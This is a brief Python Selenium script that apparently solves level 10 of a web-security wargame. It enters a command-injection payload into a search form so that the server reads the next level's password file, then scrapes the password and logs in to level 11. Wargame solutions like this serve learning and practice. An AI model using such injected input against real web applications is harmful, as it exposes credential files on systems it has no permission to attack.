from common import *
import base64

def solve(driver, _ = None):
    driver.get(build_url(level=10))

    driver.find_element(By.XPATH, '/html/body/div[1]/form/input[1]').send_keys(
        f'".*" {build_webpass_path(11)} #'
    )
    driver.find_element(By.XPATH, '/html/body/div[1]/form/input[2]').click()
    
    text = driver.find_element(By.XPATH, '//*[@id="content"]').text
    password = text[text.find("Output:\n")+len('Output:\n'):text.find('\nView sourcecode')]
    
    driver.get(build_url(password = password, level=11))
    return password